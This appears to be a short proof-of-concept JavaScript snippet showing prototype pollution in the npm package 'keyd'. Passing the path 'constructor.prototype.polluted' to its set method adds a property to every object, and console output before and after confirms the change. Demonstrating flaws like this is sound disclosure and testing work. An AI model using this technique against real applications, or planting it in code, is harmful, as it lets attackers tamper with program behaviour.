var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const keyd = require('keyd');
keyd(obj).set('constructor.prototype.polluted', 'yes');
console.log({}.polluted);